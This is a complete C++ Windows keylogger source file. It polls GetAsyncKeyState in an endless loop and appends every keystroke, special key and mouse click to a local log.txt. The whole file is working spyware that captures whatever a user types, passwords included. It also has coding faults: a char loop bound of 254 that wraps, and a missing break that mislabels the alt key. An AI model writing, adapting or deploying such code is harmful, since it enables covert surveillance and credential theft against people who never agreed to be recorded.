#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void WinLogging();

int main() {
    WinLogging();
}

void WinLogging() {
    while (true) {   
        for (char c = 0; c <= 254; c++) {
            if (GetAsyncKeyState(c) & 0x1) { // comparing last bit from both using AND
                ofstream log;
                log.open("log.txt", ios::app); // exporting o/p to log.txt

                switch (c) { // for non-alphanumeric keys
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                        log << "[LB]";
                        break;
                    case VK_RBUTTON:
                        log << "[RB]";
                        break;
                    default:
                        log << c;
                }
            }
        }
    }
}